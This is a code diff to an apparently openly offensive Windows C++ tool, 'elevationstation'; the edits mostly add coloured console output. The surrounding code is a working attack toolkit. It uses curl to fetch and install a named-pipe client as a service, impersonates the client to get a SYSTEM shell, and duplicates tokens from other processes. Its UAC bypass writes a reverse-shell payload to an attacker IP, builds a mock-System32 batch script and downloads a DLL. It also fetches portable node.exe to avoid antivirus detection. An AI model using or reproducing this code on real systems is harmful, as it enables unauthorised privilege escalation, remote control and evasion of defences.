@@ -3,6 +3,7 @@
 #include <fstream>
 #include <Windows.h>
 #include <string>
+#include <conio.h>
 #include <lmcons.h>
 #include <strsafe.h>
 #include <sddl.h>
@@ -24,11 +25,17 @@ using namespace std;
 //SID info: https://learn.microsoft.com/en-US/windows-server/identity/ad-ds/manage/understand-security-identifiers
 //lower our token integrity level example: https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer
 
+void Color(int color)
+{
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
+}
 BOOL NamedPipeImpersonate()
 {
     setProcessPrivs(SE_IMPERSONATE_NAME);
+    Color(2);
     cout << "[+] Downloading named pipe client for you from the repo\n";
-    WinExec("curl -L -o \"c:\\users\\public\\warpzoneclient.exe\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/warpzoneclient.exe\"", 0);
+    Color(7);
+    WinExec("curl -# -L -o \"c:\\users\\public\\warpzoneclient.exe\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/warpzoneclient.exe\"", 0);
     Sleep(3000);
     WinExec("cmd.exe /c sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", 0);
     
@@ -52,8 +59,10 @@ BOOL NamedPipeImpersonate()
     wchar_t message[] = L"Greetings plumber!";
     DWORD messageLenght = lstrlen(message) * 2;
     DWORD bytesWritten = 0;
-
-    std::wcout << "Creating named pipe and sleeping for 3 seconds " << pipeName << std::endl;
+    
+    Color(2);
+    std::wcout << "[+] Creating named pipe and sleeping for 3 seconds " << pipeName << std::endl;
+    Color(7);
     serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
     Sleep(3000);
     WinExec("cmd.exe /c sc start plumber", 0);
@@ -69,7 +78,9 @@ BOOL NamedPipeImpersonate()
     */
     isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
     if (isPipeConnected) {
-        std::wcout << "Incoming connection to " << pipeName << std::endl;
+        Color(2);
+        std::wcout << "[+] Incoming connection to " << pipeName << std::endl;
+        Color(7);
     }
 
     std::wcout << "Sending message: " << message << std::endl;
@@ -79,11 +90,13 @@ BOOL NamedPipeImpersonate()
     std::wcout << "Impersonating the client..." << std::endl;
     if (ImpersonateNamedPipeClient(serverPipe))
     {
+        Color(2);
         printf("[+] Successfully Impersonated the client!!\n");
+        Color(7);
     }
     else
     {
-        printf("error impersonating the client: %i\n", GetLastError());
+        printf("[!] error impersonating the client: %i\n", GetLastError());
         return false;
     }
 
@@ -141,7 +154,9 @@ BOOL NamedPipeImpersonate()
    
     if (CreateProcessAsUser(hSystemTokenDup, NULL, command, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
     {
+        Color(2);
         printf("[+] successfully created a SYSTEM shell!!!\n");
+        Color(7);
         fflush(stdout);
         WaitForSingleObject(pi.hProcess, INFINITE);
         if (hSystemToken)
@@ -280,7 +295,9 @@ int CheckProcessIntegrity(DWORD pid)
     HANDLE hTok;
     if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok))
     {
+        Color(14);
         printf("[!] There was an a permissions error applying all access to the token: %d\n", GetLastError());
+        Color(7);
     }
     DWORD lengthneeded;
     DWORD dwIntegrityLevel;
@@ -483,25 +500,35 @@ int DupThreadToken(DWORD pid)
     remoteproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
     if (remoteproc)
     {
+        Color(2);
         wprintf(L"[+] Opened remote process!\n");
+        Color(7);
     }
     else
     {
+        Color(14);
         wprintf(L"[!] OpenProcess(). Error: %d\n", GetLastError());
+        Color(7);
     }
     if (!OpenProcessToken(remoteproc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tok2))
     {
+        Color(14);
         wprintf(L"[!] OpenProcessToken(). Error: %d\n", GetLastError());
+        Color(7);
     }
 
 
     if (!DuplicateToken(tok2, SecurityImpersonation, &hNewToken))
     {
+        Color(14);
         wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        Color(7);
     }
     if (SetThreadToken(NULL, hNewToken))
     {
+        Color(2);
         printf("[+] Successfully set the thread token!\n");
+        Color(7);
     }
 
 
@@ -512,12 +539,16 @@ int DupThreadToken(DWORD pid)
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
     {
+        Color(14);
         wprintf(L"[!] OpenThreadToken(). Error: %d\n", GetLastError());
+        Color(7);
     }
     
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
+        Color(14);
         wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        Color(7);
     }
         
    
@@ -546,12 +577,16 @@ int DupThreadToken(DWORD pid)
 
     if (bRet == 0)
     {
+        Color(14);
         printf("[!] CreateProcessAsUser didn't cooperate...\n");
+        Color(7);
         printf("Return value: %d\n", GetLastError());
     }
     else
     {
+        Color(2);
         printf("[+] CreateProcessAsUser worked!!!\n");
+        Color(7);
         printf("Return value: %d\n", bRet);
         fflush(stdout);
         WaitForSingleObject(ProcInfo.hProcess, INFINITE);
@@ -615,13 +650,17 @@ int DupProcessToken(DWORD pid)
     proc2 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
     if (!proc2)
     {
+        Color(14);
         printf("[!] There was a permissions error opening process: %d w/ requested access...: %d\n", pid, GetLastError());
+        Color(7);
         exit(0);
     }
 
     if (!OpenProcessToken(proc2, MAXIMUM_ALLOWED, &tok2))
     {
+        Color(14);
         printf("[!] There was a permissions error applying the requested access to the token: %d\n", GetLastError());
+        Color(7);
         exit(0);
     }
     // TCHAR name[UNLEN + 1];
@@ -658,11 +697,15 @@ int DupProcessToken(DWORD pid)
 
     if (!DuplicateTokenEx(tok2, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
     {
+        Color(14);
         wprintf(L"[!] DuplicateTokenEx failed. Error: %d\n", GetLastError());
+        Color(7);
     }
     else
     {
+        Color(2);
         printf("[+] DuplicateTokenEx success!!!\n");
+        Color(7);
     }
     dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
 
@@ -707,12 +750,16 @@ int DupProcessToken(DWORD pid)
 
     if (bRet == 0)
     {
+        Color(14);
         printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
+        Color(7);
         printf("Return value: %d\n", GetLastError());
     }
     else
     {
+        Color(2);
         printf("[+] CreateProcessWithToken worked!!!\n");
+        Color(7);
         printf("Return value: %d\n", bRet);
         fflush(stdout);
         WaitForSingleObject(ProcInfo.hProcess, INFINITE);
@@ -729,15 +776,17 @@ void uacbypass()
     DWORD procintegrity=CheckProcessIntegrity(GetCurrentProcessId());
     if (procintegrity != 0x3000)
     {
-        printf("[+] current process is NOT elevated...time to work some magic!\n");
+        Color(14);
+        printf("[!] current process is NOT elevated...time to work some magic!\n");
+        Color(7);
     }
     else
     {
-        printf("[!] already elevated!\n");
+        Color(2);
+        printf("[+] already elevated!  Exiting...\n");
+        Color(7);
         exit(0);
     }
-    
-   
     
     cout << "generating rev shell payload now...\n";
     string revip, portnum;
@@ -762,8 +811,9 @@ void uacbypass()
     mypayload << "return /a/;\n";
     mypayload << "})();\n";
     mypayload.close();
+    Color(2);
     cout << ".js rev shell payload created! It's located at: C:\\users\\public\\elevationstation.js\n";
-
+    Color(7);
     cout << "now, we need to generate the uac bypass script...\n";
     ofstream uacbyppayload;
     uacbyppayload.open("c:\\users\\public\\elevateit.bat");
@@ -778,13 +828,17 @@ void uacbypass()
     uacbyppayload << "rmdir \"C:\\Windows \\System32\\\"\n";
     uacbyppayload << "rmdir \"C:\\Windows \\\"\n";
     uacbyppayload.close();
-    cout << "uac byp@ss script created! It's located at: C:\\users\\public\\elevateit.bat\n";
+    Color(2);
+    cout << "[+] uac byp@ss script created! It's located at: C:\\users\\public\\elevateit.bat\n";
+    Color(7);
     cout << "Downloading necessary scripts...\n";
     printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV detection ;)\n");
-    WinExec("curl -L -o \"c:\\users\\public\\n0de.exe\" \"https://nodejs.org/download/release/latest/win-x64/node.exe\"", 0); //download directly from nodejs file repo
-    WinExec("curl -L -o \"c:\\temp\\netutils.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
-    cout << "while waiting for download to finish, go ahead and start your listener on your attacker box\n";
-    cout << "You can see the progress of the download in your foothold reverse shell ;)  hit [enter] when it's finished to pop your elevated shell!\n";
+    WinExec("curl -# -L -o \"c:\\users\\public\\n0de.exe\" \"https://nodejs.org/download/release/latest/win-x64/node.exe\"", 0); //download directly from nodejs file repo
+    WinExec("curl -# -L -o \"c:\\temp\\netutils.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
+    Color(2);
+    cout << "[+] while waiting for download to finish, go ahead and start your listener on your attacker box\n";
+    cout << "You can see the download progress for two files in your foothold reverse shell ;)\nhit [enter] when both reach 100 percent and enjoy your newly spawned elevated shell!\n";
+    Color(7);
     cin.get();
     cin.get();
     WinExec("c:\\users\\public\\elevateit.bat", 0);
@@ -809,7 +863,9 @@ int main(int argc, char* argv[])
     DWORD pid;
     if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0 && strcmp(argv[1], "-np") != 0 && strcmp(argv[1], "-uac") != 0 && strcmp(argv[1], "-h") != 0)
     {
+        Color(2);
         printf("elevationstation.exe -h [lists all commands]\n");
+        Color(7);
         exit(0);
     }
     /*
